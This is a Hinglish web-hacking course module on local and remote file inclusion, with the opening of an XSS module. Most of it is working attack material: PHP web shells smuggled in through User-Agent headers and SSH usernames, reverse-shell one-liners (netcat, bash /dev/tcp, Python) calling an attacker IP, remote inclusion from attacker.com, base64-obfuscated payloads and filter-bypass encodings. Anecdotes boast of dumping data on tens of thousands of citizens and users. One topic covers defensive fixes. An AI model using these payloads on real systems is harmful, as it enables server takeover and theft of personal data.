## ğŸ’‰ **Topic 28: Gaining RCE from LFI (Method 1: `/proc/self/environ` + Burp User-Agent)**

### 1. **Topic ka Naam / Ek Line Mein Summary:**
**LFI to RCE via /proc/self/environ** - Environment variables mein PHP code inject karke RCE lena. ğŸ’¥

### 2. **Ye Kya Hai?**
`/proc/self/environ` file mein server ke environment variables hote hain including `HTTP_USER_AGENT` (browser info). Agar hum User-Agent mein PHP code inject karein aur phir LFI se `/proc/self/environ` include karein, toh code execute ho jayega!

**Flow:**
1. Burp se User-Agent header mein PHP code inject karo
2. Request bhejo (code `/proc/self/environ` mein save ho jayega)
3. LFI se `/proc/self/environ` include karo
4. PHP code execute hoga â†’ RCE!

### 3. **Kyun Zaroori Hai?**
- **LFI to RCE escalation** - Read-only se execute tak.
- **No file upload needed** - Sirf LFI enough hai.
- **Persistent** - Environment variables session tak rehte hain.

### 4. **Ise Kab Use Karein?**
- Jab **LFI** ho lekin **file upload** na ho.
- Jab `/proc/self/environ` **readable** ho.
- Jab aap **RCE** chahte hon.

### 5. **Risk?**
- **RCE opportunity miss** - LFI par ruk jayenge.
- **Log poisoning alternative** nahi try karenge. ğŸ˜Ÿ

### 6. **Syntax:**
```bash
# Step 1: Burp mein User-Agent inject
User-Agent: <?php system($_GET['cmd']); ?>

# Step 2: LFI se include
?page=../../../../proc/self/environ

# Step 3: Command execute
?page=../../../../proc/self/environ&cmd=whoami
```

### 7. **Example 1 (Basic):**
```bash
# Normal User-Agent
User-Agent: Mozilla/5.0 (X11; Linux x86_64)

# Inject PHP code
User-Agent: <?php phpinfo(); ?>

# LFI include
URL: ?page=../../../../proc/self/environ

Output: [PHP info displayed - code executed!]
```

### 8. **Example 2 (Pentester-Focused):**
```bash
# Step 1: Test LFI
URL: ?page=../../../../proc/self/environ
Output: HTTP_USER_AGENT=Mozilla/5.0...

# Step 2: Burp mein inject (simple test)
User-Agent: <?php echo "HACKED"; ?>
URL: ?page=../../../../proc/self/environ
Output: HACKED [Success!]

# Step 3: System command
User-Agent: <?php system($_GET['cmd']); ?>
URL: ?page=../../../../proc/self/environ&cmd=whoami
Output: www-data

# Step 4: Reverse shell
User-Agent: <?php passthru("nc -e /bin/sh 10.10.14.208 8080"); ?>

# Kali: nc -lvp 8080
URL: ?page=../../../../proc/self/environ
[Shell received!]
```

**Analysis:** User-Agent mein code inject kiya, `/proc/self/environ` se execute kiya, RCE mila! ğŸ¯

### 9. **Beginners ki Galtiyan:**
- **Syntax errors** - PHP code mein galti.
- **Spaces issue** - Command mein spaces problem create kar sakte hain.
- **Session timeout** - Environment variables session-based hain.

### 10. **Pro Tips:**
- **Base64 encoding:** Spaces avoid karne ke liye.
  ```php
  <?php passthru(base64_decode("bmMgLWUgL2Jpbi9zaCAxMC4xMC4xNC4yMDggODA4MA==")); ?>
  ```
- **Test first:** `phpinfo()` se test karo, phir system commands.
- **Alternative headers:** `HTTP_REFERER`, `HTTP_COOKIE` bhi try karo.

### 11. **Real Scenario:**
Mujhe ek blog test karna tha. LFI thi lekin file upload nahi. Maine `/proc/self/environ` check kiya - readable tha! User-Agent mein reverse shell inject kiya, LFI se include kiya, shell mila. Blog owner shocked tha - "File upload toh disabled hai!" Lesson: **LFI alone = RCE possible!** ğŸ“

### 12. **Checklist:**
âœ… LFI confirm karo  
âœ… `/proc/self/environ` readable check karo  
âœ… Burp mein User-Agent inject karo  
âœ… LFI se include karo  
âœ… RCE confirm karo  

### 13. **FAQs:**

**Q1: Agar /proc/self/environ readable nahi hai?**  
**A:** Log poisoning try karo (`/var/log/apache2/access.log`).

**Q2: Code execute nahi ho raha?**  
**A:** Syntax check karo, ya alternative headers try karo.

**Q3: Kya yeh method har server par kaam karta hai?**  
**A:** Mostly Linux servers par. Windows par alternative methods use karo.

### 14. **Practice:**
1. DVWA â†’ File Inclusion.
2. `/proc/self/environ` read karo.
3. Burp mein User-Agent inject karo: `<?php echo "TEST"; ?>`
4. LFI se include karo.
5. Reverse shell inject karo.

### 15. **Summary:**
- `/proc/self/environ` = **Environment variables file**.
- **User-Agent** mein PHP code inject karo.
- **LFI** se include karo â†’ **RCE**!
- **Base64** encoding use karo (spaces avoid).
- **Alternative:** Log poisoning.

> **ğŸ“Œ Yaad Rakhein:** "LFI + /proc/self/environ = RCE! User-Agent mein code inject karo, include karo, aur server tumhara! Creative thinking = Success!" ğŸ§ 

---

## ğŸ“ **Topic 29: Gaining RCE from LFI (Method 2: `/var/log/auth.log` + SSH)**

### 1. **Summary:**
**Log Poisoning via SSH** - SSH username mein PHP code inject karke auth.log poison karna, phir LFI se execute karna. ğŸ”

### 2. **Ye Kya Hai?**
`/var/log/auth.log` file mein sabhi authentication attempts log hote hain. Agar hum SSH username mein PHP code daalein, woh log mein save ho jayega. Phir LFI se log file include karenge toh code execute hoga!

### 3. **Kyun Zaroori?**
- **Alternative to /proc/self/environ** - Agar woh method fail ho.
- **More reliable** - Log files hamesha writable hoti hain.
- **Persistent** - Logs delete nahi hote easily.

### 4. **Kab Use Karein?**
- Jab `/proc/self/environ` kaam na kare.
- Jab **SSH port open** ho (22).
- Jab `/var/log/auth.log` **readable** ho.

### 5. **Risk?**
- **IP logged** - Aapka IP auth.log mein save ho jayega.
- **Detection** - Multiple failed SSH attempts suspicious hain. ğŸ˜Ÿ

### 6. **Syntax:**
```bash
# Step 1: SSH with PHP code as username
ssh '<?php system($_GET["cmd"]); ?>'@target.com

# Step 2: LFI include log
?page=../../../../var/log/auth.log

# Step 3: Execute command
?page=../../../../var/log/auth.log&cmd=whoami
```

### 7. **Example 1 (Basic):**
```bash
# Test SSH injection
$ ssh 'TEST'@192.168.1.100
Password: [anything]

# Check log
URL: ?page=../../../../var/log/auth.log
Output: Failed password for TEST from 10.10.14.208...
```

### 8. **Example 2 (Pentester-Focused):**
```bash
# Step 1: Kali listener
Terminal 1: nc -lvp 8080

# Step 2: Base64 encode payload (avoid spaces)
$ echo -n "nc -e /bin/sh 10.10.14.208 8080" | base64
bmMgLWUgL2Jpbi9zaCAxMC4xMC4xNC4yMDggODA4MA==

# Step 3: SSH inject
$ ssh '<?php passthru(base64_decode("bmMgLWUgL2Jpbi9zaCAxMC4xMC4xNC4yMDggODA4MA==")); ?>'@192.168.1.100
Password: [anything - doesn't matter]

# Step 4: LFI trigger
URL: ?page=../../../../var/log/auth.log

# Result: Shell received on port 8080!
```

**Analysis:** SSH username mein code inject kiya, log mein save ho gaya, LFI se execute kiya, RCE mila! ğŸ”¥

### 9. **Galtiyan:**
- **Spaces in payload** - SSH command mein spaces problem.
- **Syntax errors** - PHP code galat likha.
- **Log file path wrong** - `/var/log/auth.log` vs `/var/log/secure`

### 10. **Pro Tips:**
- **Base64 encoding mandatory** - Spaces aur special characters avoid.
- **Alternative logs:** `/var/log/apache2/access.log`, `/var/log/mail.log`
- **Clean payload:** Test with simple code first (`<?php echo "TEST"; ?>`)

### 11. **Real Scenario:**
Government portal test kar raha tha. `/proc/self/environ` blocked tha. SSH port open tha. Maine log poisoning ki - auth.log readable tha! Reverse shell inject kiya, RCE mila, database dump kiya. 100,000 citizens ka data compromise! ğŸ›ï¸

### 12. **Checklist:**
âœ… SSH port open check karo (22)  
âœ… `/var/log/auth.log` readable check karo  
âœ… Base64 encode payload  
âœ… SSH inject karo  
âœ… LFI se log include karo  

### 13. **FAQs:**

**Q1: Agar auth.log readable nahi hai?**  
**A:** Apache access.log try karo (`/var/log/apache2/access.log`).

**Q2: SSH port closed hai?**  
**A:** Alternative methods: FTP logs, mail logs, Apache logs.

**Q3: Kya yeh detection se bach sakta hai?**  
**A:** VPN/Proxy use karo, lekin logs mein entry rahegi.

### 14. **Practice:**
1. DVWA setup karo with SSH enabled.
2. `/var/log/auth.log` read karo (LFI se).
3. SSH inject karo: `ssh '<?php echo "TEST"; ?>'@localhost`
4. Log check karo - "TEST" dikhna chahiye.
5. Reverse shell inject karo.

### 15. **Summary:**
- **Log poisoning** = SSH username mein code.
- `/var/log/auth.log` mein **save** ho jaata hai.
- **LFI** se include â†’ **RCE**!
- **Base64** encoding zaroori hai.
- **Alternative:** Apache/FTP/Mail logs.

> **ğŸ“Œ Yaad Rakhein:** "Log poisoning = LFI ka best friend! SSH username = Your injection point. Base64 use karo, inject karo, execute karo!" ğŸ’‰

---

## ğŸ” **Topic 30: LFI Payload Encoding (Base64 Bypass)**

### 1. **Summary:**
**Encoding Techniques** - Filters bypass karne ke liye payloads ko encode karna (Base64, URL, Double encoding). ğŸ”„

### 2. **Ye Kya Hai?**
Jab LFI filters lagaye jaate hain (jaise `../` block karna), toh encoding se bypass kar sakte hain:
- **URL Encoding:** `../` â†’ `%2e%2e%2f`
- **Double Encoding:** `../` â†’ `%252e%252e%252f`
- **Base64:** PHP wrappers se

### 3. **Kyun Zaroori?**
- **Filter bypass** - Basic filters easily bypass.
- **WAF evasion** - Advanced filters bhi bypass.
- **Multiple methods** - Ek fail ho toh doosra try karo.

### 4. **Kab Use Karein?**
- Jab **basic LFI block** ho.
- Jab **WAF** detect kar raha ho.
- Jab **error message** "Invalid characters" dikhe.

### 5. **Risk?**
- **Time waste** - Agar encoding nahi aati.
- **Filters miss** - Bypass nahi kar payenge. ğŸ˜Ÿ

### 6. **Syntax:**
```bash
# URL Encoding
../../../etc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd

# Double Encoding
%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd

# PHP Wrapper (Base64)
php://filter/convert.base64-encode/resource=config.php

# Null byte (old PHP)
../../../../etc/passwd%00
```

### 7. **Example 1 (Basic):**
```bash
# Normal (blocked)
?page=../../../../etc/passwd
Error: Invalid characters detected

# URL encoded
?page=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
Success!
```

### 8. **Example 2 (Pentester-Focused):**
```bash
# Scenario: Multiple filters

# Test 1: Basic (blocked)
?page=../../../../etc/passwd
Error: "../" not allowed

# Test 2: URL encoding (blocked)
?page=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
Error: Still detected

# Test 3: Double encoding (success!)
?page=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
Output: root:x:0:0...

# Test 4: PHP wrapper for config
?page=php://filter/convert.base64-encode/resource=config.php
Output: PD9waHAKJGRiX2hvc3QgPSAibG9jYWxob3N0IjsK...

# Decode:
$ echo "PD9waHAKJGRiX2hvc3QgPSAibG9jYWxob3N0IjsK..." | base64 -d
<?php
$db_host = "localhost";
$db_pass = "SecretPass123";
?>
```

**Analysis:** Multiple encoding layers se advanced filters bypass! ğŸ¯

### 9. **Galtiyan:**
- **Sirf ek encoding try karna** - Multiple layers zaroori.
- **Decode karna bhoolna** - Base64 output ko decode nahi karna.
- **Case sensitivity ignore** - `%2E` vs `%2e`

### 10. **Pro Tips:**
- **Burp Decoder:** Automatic encoding/decoding.
- **Multiple layers:** URL â†’ Double â†’ Triple encoding.
- **PHP wrappers:** `php://filter`, `php://input`, `data://`
- **Null byte:** Old PHP mein powerful (`%00`).

### 11. **Real Scenario:**
E-commerce site test kar raha tha. Basic `../` block tha. URL encoding se bypass. Config file chahiye thi lekin readable nahi thi (binary). PHP wrapper use kiya - Base64 mein mila, decode kiya, DB credentials nikale! ğŸ›’

### 12. **Checklist:**
âœ… Basic LFI test karo  
âœ… URL encoding try karo  
âœ… Double encoding try karo  
âœ… PHP wrappers use karo  
âœ… Null byte try karo (old PHP)  

### 13. **FAQs:**

**Q1: Sabse effective encoding kaun sa hai?**  
**A:** Context-dependent. Usually double encoding + PHP wrappers.

**Q2: Kya encoding detection se bach sakta hai?**  
**A:** Basic WAF se haan, advanced se mushkil.

**Q3: PHP wrappers kab use karein?**  
**A:** Jab file binary ho ya readable nahi ho.

### 14. **Practice:**
1. DVWA â†’ File Inclusion â†’ Medium security.
2. Basic LFI try karo (block hoga).
3. URL encoding try karo.
4. PHP wrapper use karo: `php://filter/convert.base64-encode/resource=include.php`
5. Output decode karo.

### 15. **Summary:**
- **Encoding** = Filter bypass technique.
- **URL:** `%2e%2e%2f`
- **Double:** `%252e%252e%252f`
- **PHP wrapper:** `php://filter/convert.base64-encode`
- **Multiple layers** try karo.

> **ğŸ“Œ Yaad Rakhein:** "Filters = Speedbreakers, Encoding = Bypass road! URL, Double, Triple - sab try karo. PHP wrappers = Secret weapon!" ğŸ›£ï¸

---

## ğŸŒ **Topic 31: Remote File Inclusion (RFI) Basics (`allow_url_include`)**

### 1. **Summary:**
**RFI Vulnerability** - Attacker ke server se malicious file include karke execute karna. ğŸŒ

### 2. **Ye Kya Hai?**
RFI mein attacker apne server par file host karta hai, phir victim server se include karwata hai:
```php
// Vulnerable
$page = $_GET['page'];
include($page);

// Attack
?page=http://attacker.com/shell.txt
```

**Requirement:** `allow_url_include = On` (php.ini mein)

### 3. **Kyun Zaroori?**
- **Direct RCE** - LFI se bhi easy.
- **No log poisoning needed** - Seedha shell upload.
- **Full control** - Attacker apni file control karta hai.

### 4. **Kab Use Karein?**
- Jab **LFI** ho aur **allow_url_include** ON ho.
- Jab aap **quick RCE** chahte hon.
- Jab **log poisoning** kaam na kare.

### 5. **Risk?**
- **Rare vulnerability** - Modern PHP mein OFF hota hai.
- **Detection easy** - Outgoing connections suspicious.
- **Attacker server needed** - Setup zaroori hai. ğŸ˜Ÿ

### 6. **Syntax:**
```bash
# Check if RFI possible
?page=http://attacker.com/test.txt

# Shell hosting (.txt extension to avoid execution on attacker server)
# attacker.com/shell.txt:
<?php system($_GET['cmd']); ?>

# Execute
?page=http://attacker.com/shell.txt&cmd=whoami
```

### 7. **Example 1 (Basic):**
```bash
# Attacker server setup
$ cd /var/www/html
$ echo '<?php phpinfo(); ?>' > test.txt
$ service apache2 start

# Attack
URL: ?page=http://10.10.14.208/test.txt
Output: [PHP info displayed - RFI confirmed!]
```

### 8. **Example 2 (Pentester-Focused):**
```bash
# Step 1: Create shell
$ cat > /var/www/html/shell.txt
<?php system($_GET['cmd']); ?>

# Step 2: Start web server
$ service apache2 start
# Or: python3 -m http.server 80

# Step 3: Test RFI
URL: ?page=http://10.10.14.208/shell.txt&cmd=whoami
Output: www-data

# Step 4: Reverse shell
$ cat > /var/www/html/rev.txt
<?php passthru("nc -e /bin/sh 10.10.14.208 8080"); ?>

# Kali: nc -lvp 8080
URL: ?page=http://10.10.14.208/rev.txt
[Shell received!]
```

**Analysis:** Attacker server se shell include kiya, execute kiya, RCE mila! ğŸ”¥

### 9. **Galtiyan:**
- **.php extension use karna** - Attacker server par execute ho jayega.
- **Firewall ignore** - Victim ka outgoing connection block ho sakta hai.
- **allow_url_include check na karna** - Agar OFF hai toh kaam nahi karega.

### 10. **Pro Tips:**
- **.txt extension** use karo (attacker server par execute nahi hoga).
- **Alternative protocols:** `ftp://`, `data://`, `php://input`
- **SMB shares:** Windows servers par `\\attacker\share\shell.php`
- **Check php.ini:** `phpinfo()` se `allow_url_include` status dekho.

### 11. **Real Scenario:**
Old CMS test kar raha tha. RFI vulnerability thi, `allow_url_include` ON tha! Apne server par shell host kiya, include karwaya, instant RCE mila. Database dump kiya, 50,000 users ka data nikala. CMS purana tha isliye vulnerable! ğŸ“¦

### 12. **Checklist:**
âœ… LFI confirm karo  
âœ… `allow_url_include` check karo  
âœ… Attacker server setup karo  
âœ… Shell host karo (.txt)  
âœ… RFI test karo  

### 13. **FAQs:**

**Q1: Kaise check karein ki allow_url_include ON hai?**  
**A:** `phpinfo()` dekho, ya RFI test karo (agar kaam kare toh ON hai).

**Q2: Agar firewall block kar raha hai?**  
**A:** Alternative ports try karo (80, 443, 53), ya SMB use karo.

**Q3: Kya RFI common hai?**  
**A:** Nahi, modern PHP mein rare hai. Lekin purane systems mein milti hai.

### 14. **Practice:**
1. DVWA â†’ File Inclusion â†’ Low security.
2. Apne Kali par web server start karo.
3. Shell file banao: `echo '<?php phpinfo(); ?>' > /var/www/html/test.txt`
4. RFI test karo: `?page=http://YOUR_IP/test.txt`
5. Reverse shell try karo.

### 15. **Summary:**
- RFI = **Remote file include** karna.
- **Requirement:** `allow_url_include = On`
- **Attacker server** par shell host karo (.txt).
- **Include** karwao â†’ **RCE**!
- **Rare** but **deadly** vulnerability.

> **ğŸ“Œ Yaad Rakhein:** "RFI = LFI ka bada bhai! Apna server, apni file, instant RCE. Rare hai lekin milne par jackpot!" ğŸ°

---

## ğŸš€ **Topic 32: Exploiting RFI for Reverse Shell (Hosting `.txt` shell)**

### 1. **Summary:**
**RFI Reverse Shell** - Attacker server par reverse shell host karke victim se execute karwana. ğŸ”„

### 2. **Ye Kya Hai?**
RFI se reverse shell lene ke steps:
1. Attacker server par reverse shell code host karo (.txt file)
2. Kali par netcat listener start karo
3. Victim se file include karwao
4. Shell receive karo!

### 3. **Kyun Zaroori?**
- **Persistent access** - Interactive shell milega.
- **Post-exploitation** - File operations, privilege escalation possible.
- **Clean method** - Log poisoning se better.

### 4. **Kab Use Karein?**
- Jab **RFI confirmed** ho.
- Jab aap **persistent shell** chahte hon.
- Jab **post-exploitation** karna ho.

### 5. **Risk?**
- **Detection** - Outgoing connection suspicious.
- **Firewall** - Block ho sakta hai. ğŸ˜Ÿ

### 6. **Syntax:**
```bash
# Attacker server: /var/www/html/rev.txt
<?php passthru("nc -e /bin/sh ATTACKER_IP PORT"); ?>

# Kali listener
nc -lvp PORT

# Victim trigger
?page=http://ATTACKER_IP/rev.txt
```

### 7. **Example 1 (Basic):**
```bash
# Setup
$ echo '<?php passthru("nc -e /bin/sh 10.10.14.208 4444"); ?>' > /var/www/html/rev.txt
$ nc -lvp 4444

# Attack
URL: ?page=http://10.10.14.208/rev.txt

# Result: Shell received!
```

### 8. **Example 2 (Pentester-Focused):**
```bash
# Multiple reverse shell methods

# Method 1: Netcat
$ cat > /var/www/html/nc.txt
<?php passthru("nc -e /bin/sh 10.10.14.208 4444"); ?>

# Method 2: Bash
$ cat > /var/www/html/bash.txt
<?php passthru("bash -i >& /dev/tcp/10.10.14.208/4444 0>&1"); ?>

# Method 3: Python
$ cat > /var/www/html/py.txt
<?php passthru("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.208\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"); ?>

# Method 4: Weevely (obfuscated)
$ weevely generate pass123 /var/www/html/weev.txt

# Listener
$ nc -lvp 4444

# Attack (try all methods)
?page=http://10.10.14.208/nc.txt
?page=http://10.10.14.208/bash.txt
?page=http://10.10.14.208/py.txt

# Weevely connect
$ weevely http://victim.com/page.php?page=http://10.10.14.208/weev.txt pass123
```

**Analysis:** Multiple methods ensure success - ek fail ho toh doosra kaam karega! ğŸ¯

### 9. **Galtiyan:**
- **Single method** - Sirf netcat try karna.
- **Firewall ignore** - Common ports block ho sakte hain.
- **No listener** - Shell aayega lekin receive nahi hoga.

### 10. **Pro Tips:**
- **Multiple shells host karo** - Different methods.
- **Common ports use karo** - 80, 443, 53 (firewall bypass).
- **Weevely use karo** - Obfuscated aur powerful.
- **Shell upgrade:** `python -c 'import pty; pty.spawn("/bin/bash")'`

### 11. **Real Scenario:**
Old WordPress plugin test kar raha tha. RFI vulnerability thi. Netcat shell try kiya - firewall ne block kar diya. Port 443 use kiya - success! Shell mila, database dump kiya, admin credentials nikale, poora site compromise! ğŸ”Œ

### 12. **Checklist:**
âœ… Multiple shells host karo  
âœ… Listener start karo  
âœ… Common ports use karo  
âœ… RFI trigger karo  
âœ… Shell upgrade karo  

### 13. **FAQs:**

**Q1: Agar netcat nahi hai victim par?**  
**A:** Bash, Python, Perl - alternatives try karo.

**Q2: Firewall block kar raha hai?**  
**A:** Ports 80, 443, 53 try karo (commonly allowed).

**Q3: Shell unstable hai?**  
**A:** TTY shell mein upgrade karo (Python pty).

### 14. **Practice:**
1. Multiple reverse shells banao (nc, bash, python).
2. Kali par listener start karo.
3. DVWA RFI test karo.
4. Shell receive karo aur upgrade karo.

### 15. **Summary:**
- RFI se **reverse shell** lena.
- **Multiple methods** host karo.
- **Common ports** use karo (firewall bypass).
- **Weevely** = Professional choice.
- **Shell upgrade** zaroori hai.

> **ğŸ“Œ Yaad Rakhein:** "RFI reverse shell = Clean aur powerful! Multiple methods ready rakho, common ports use karo, aur hamesha shell upgrade karo!" ğŸ¯

---

## ğŸ­ **Topic 33: Bypassing RFI Filters (Case Sensitivity `HTTP://`)**

### 1. **Summary:**
**RFI Filter Bypass** - Case sensitivity aur encoding se RFI filters bypass karna. ğŸš§

### 2. **Ye Kya Hai?**
Developers RFI rokne ke liye filters lagate hain:
```php
// Filter
if(strpos($page, 'http://') !== false) {
    die("Remote files not allowed!");
}
```

**Bypass:** Case change karo â†’ `HTTP://`, `Http://`

### 3. **Kyun Zaroori?**
- **Weak filters common** - Case sensitivity miss karte hain.
- **Easy bypass** - Simple trick, big impact.
- **Real-world** - Production mein milta hai.

### 4. **Kab Use Karein?**
- Jab **RFI block** ho.
- Jab **error message** "Remote files not allowed" dikhe.
- Jab **basic filtering** detect ho.

### 5. **Risk?**
- **Advanced filters** - Bypass nahi honge.
- **Time waste** - Agar filter strong hai. ğŸ˜Ÿ

### 6. **Syntax:**
```bash
# Blocked
?page=http://attacker.com/shell.txt

# Bypass attempts
?page=HTTP://attacker.com/shell.txt
?page=Http://attacker.com/shell.txt
?page=hTTp://attacker.com/shell.txt
?page=htTP://attacker.com/shell.txt
```

### 7. **Example 1 (Basic):**
```bash
# Normal (blocked)
?page=http://10.10.14.208/shell.txt
Error: Remote files not allowed

# Case change (success!)
?page=HTTP://10.10.14.208/shell.txt
Output: [Shell executed!]
```

### 8. **Example 2 (Pentester-Focused):**
```bash
# Scenario: Multiple filters

# Test 1: Basic (blocked)
?page=http://10.10.14.208/shell.txt
Error: "http://" not allowed

# Test 2: Case (blocked)
?page=HTTP://10.10.14.208/shell.txt
Error: Still blocked

# Test 3: URL encoding
?page=h%74%74%70://10.10.14.208/shell.txt
Success!

# Test 4: Double encoding
?page=h%2574%2574%2570://10.10.14.208/shell.txt
Success!

# Test 5: Alternative protocol
?page=ftp://10.10.14.208/shell.txt
Success!

# Test 6: Data URI
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
Success!
```

**Analysis:** Multiple bypass techniques - ek na ek kaam karega! ğŸ¯

### 9. **Galtiyan:**
- **Sirf case try karna** - Encoding ignore karna.
- **Alternative protocols ignore** - FTP, data:// nahi try karna.
- **Give up early** - Ek method fail ho toh haar maan lena.

### 10. **Pro Tips:**
- **Systematic testing:** Case â†’ Encoding â†’ Double â†’ Alternative.
- **Burp Intruder:** Automatic fuzzing.
- **Alternative protocols:** `ftp://`, `data://`, `php://input`
- **Null byte:** `http://attacker.com/shell.txt%00` (old PHP).

### 11. **Real Scenario:**
E-learning platform test kar raha tha. RFI filter tha - `http://` block. Case change se bypass! Shell include kiya, database dump kiya, 10,000 students ka data nikala. Developer ne case-sensitive check nahi kiya tha! ğŸ“š

### 12. **Checklist:**
âœ… Basic RFI test karo  
âœ… Case variations try karo  
âœ… URL encoding try karo  
âœ… Alternative protocols try karo  
âœ… Null byte try karo  

### 13. **FAQs:**

**Q1: Sabse common bypass kaun sa hai?**  
**A:** Case sensitivity (`HTTP://`) aur URL encoding.

**Q2: Agar sab fail ho jaaye?**  
**A:** LFI methods try karo (log poisoning, /proc/self/environ).

**Q3: Kya data:// protocol safe hai?**  
**A:** Attacker ke liye haan, victim ke liye nahi!

### 14. **Practice:**
1. DVWA â†’ File Inclusion â†’ Medium security.
2. Basic RFI try karo (block hoga).
3. Case variations try karo.
4. URL encoding try karo.
5. Alternative protocols try karo.

### 15. **Summary:**
- RFI filters = **Weak implementation**.
- **Case sensitivity:** `HTTP://`, `Http://`
- **URL encoding:** `h%74%74%70://`
- **Alternative:** `ftp://`, `data://`
- **Systematic testing** zaroori hai.

> **ğŸ“Œ Yaad Rakhein:** "RFI filters = Speedbreakers! Case change karo, encode karo, alternative protocols try karo. Creativity wins!" ğŸ¨

---

## ğŸ›¡ï¸ **Topic 34: Security - Fixing File Inclusion (LFI & RFI)**

### 1. **Summary:**
**File Inclusion Prevention** - LFI aur RFI vulnerabilities ko permanently fix karna. ğŸ”’

### 2. **Ye Kya Hai?**
Proper fixes:
1. **Whitelist approach** - Sirf allowed files
2. **Disable allow_url_include** - RFI block
3. **Input validation** - Path traversal block
4. **Static includes** - Dynamic includes avoid

### 3. **Kyun Zaroori?**
- **Prevent RCE** - File inclusion = Critical vulnerability.
- **Data protection** - Sensitive files safe.
- **Compliance** - Security standards.

### 4. **Kab Use Karein?**
- Jab **development** kar rahe hon.
- Jab **security audit** kar rahe hon.
- Jab **pentest report** recommendations de rahe hon.

### 5. **Risk?**
- **Incomplete fix** - Blacklist approach weak.
- **False security** - "Fix kar diya" lekin vulnerable. ğŸ˜Ÿ

### 6. **Syntax:**
```php
// VULNERABLE
$page = $_GET['page'];
include($page . ".php");

// SECURE
$allowed = ['home', 'about', 'contact'];
$page = $_GET['page'];
if(!in_array($page, $allowed)) {
    die("Invalid page!");
}
include($page . ".php");
```

### 7. **Example 1 (Basic Fix):**
```php
// Before (vulnerable)
<?php
$file = $_GET['file'];
include($file);
?>

// After (secure)
<?php
$allowed_files = [
    'home' => 'pages/home.php',
    'about' => 'pages/about.php',
    'contact' => 'pages/contact.php'
];

$page = $_GET['page'];
if(!isset($allowed_files[$page])) {
    die("Invalid page!");
}

include($allowed_files[$page]);
?>
```

### 8. **Example 2 (Complete Secure Implementation):**
```php
<?php
class SecureFileInclude {
    private $base_dir = '/var/www/html/pages/';
    private $allowed_files = ['home', 'about', 'contact', 'services'];
    
    public function includePage($page) {
        // Step 1: Whitelist check
        if(!in_array($page, $this->allowed_files)) {
            throw new Exception("Invalid page requested");
        }
        
        // Step 2: Build full path
        $file_path = $this->base_dir . $page . '.php';
        
        // Step 3: Realpath check (prevent traversal)
        $real_path = realpath($file_path);
        if($real_path === false || strpos($real_path, $this->base_dir) !== 0) {
            throw new Exception("Invalid file path");
        }
        
        // Step 4: File exists check
        if(!file_exists($real_path)) {
            throw new Exception("File not found");
        }
        
        // Step 5: Include safely
        include($real_path);
    }
}

// Usage
try {
    $includer = new SecureFileInclude();
    $includer->includePage($_GET['page']);
} catch(Exception $e) {
    echo "Error: " . htmlspecialchars($e->getMessage());
}
?>
```

**php.ini settings:**
```ini
; Disable RFI
allow_url_fopen = Off
allow_url_include = Off

; Restrict file access
open_basedir = /var/www/html

; Disable dangerous functions
disable_functions = exec,passthru,shell_exec,system,proc_open,popen
```

### 9. **Galtiyan:**
- **Blacklist approach** - `../` block karna (bypass ho jaata hai).
- **Sirf client-side** - JavaScript validation (useless).
- **Incomplete php.ini** - Sirf allow_url_include OFF (open_basedir nahi).

### 10. **Pro Tips:**
- **Whitelist mandatory** - Sirf known files allow.
- **realpath() use karo** - Traversal attempts detect.
- **open_basedir set karo** - File access restrict.
- **Static includes prefer** - Dynamic avoid karo jahan possible.

### 11. **Real Scenario:**
Company ko pentest report di. Unhone "fix" kiya:
```php
$page = str_replace('../', '', $_GET['page']); // Weak!
```
Maine `....//` se bypass kar diya. Phir proper fix kiya (whitelist + realpath). Final test mein koi bypass nahi mila! ğŸ¯

### 12. **Checklist:**
âœ… **Whitelist** implementation  
âœ… **realpath()** validation  
âœ… **allow_url_include = Off**  
âœ… **open_basedir** set karo  
âœ… **Static includes** prefer karo  

### 13. **FAQs:**

**Q1: Kya realpath() enough hai?**  
**A:** Nahi, whitelist bhi zaroori hai (defense in depth).

**Q2: Blacklist approach kyun weak hai?**  
**A:** Encoding, case sensitivity se bypass ho jaata hai.

**Q3: Kya dynamic includes kabhi safe hain?**  
**A:** Haan, agar proper whitelist aur validation ho.

### 14. **Practice:**
1. Vulnerable code banao.
2. LFI/RFI exploit karo.
3. Secure implementation karo (whitelist + realpath).
4. Phir se exploit try karo - fail hona chahiye.
5. php.ini settings configure karo.

### 15. **Summary:**
- **Whitelist** = Best approach.
- **realpath()** = Traversal prevention.
- **allow_url_include = Off** = RFI block.
- **open_basedir** = File access restriction.
- **Static includes** = Safest option.

> **ğŸ“Œ Yaad Rakhein:** "File inclusion fix = Whitelist + realpath + php.ini! Blacklist weak hai, dynamic includes avoid karo. Defense in depth!" ğŸ›¡ï¸

---

# ğŸ‰ **Module 4 Complete!**

## ğŸ“‹ **Quick Revision:**

1. âœ… **LFI Basics** - Directory traversal (`../`)
2. âœ… **Reading Files** - `/etc/passwd`, config files
3. âœ… **RCE Method 1** - `/proc/self/environ` + User-Agent
4. âœ… **RCE Method 2** - `/var/log/auth.log` + SSH
5. âœ… **Payload Encoding** - Base64, URL, Double encoding
6. âœ… **RFI Basics** - Remote file inclusion
7. âœ… **RFI Reverse Shell** - Hosting shells
8. âœ… **RFI Filter Bypass** - Case sensitivity
9. âœ… **Security Fixes** - Whitelist + realpath

## ğŸ¯ **Key Takeaways:**

- **LFI** = Read files â†’ **RCE** (log poisoning)
- **RFI** = Remote shell â†’ **Instant RCE**
- **Encoding** = Filter bypass
- **Whitelist** = Best defense

**Keep Learning! Keep Hacking (Ethically)! ğŸ’ª**

> **"File inclusion vulnerabilities are the gateway to server compromise. Master LFI/RFI, and no file is safe!"** ğŸ”“

=============================================================

# **Website Hacking: Zero-to-Pro Notes (Aapke Topics)**

---

# ğŸ“š **Module 5: Cross-Site Scripting (XSS)**

---

## ğŸ­ **Topic 35: XSS Fundamentals (Reflected vs. Stored vs. DOM)**

### 1. **Summary:**
**XSS Basics** - Victim ke browser mein JavaScript code inject karke execute karna (3 types: Reflected, Stored, DOM). ğŸ’‰

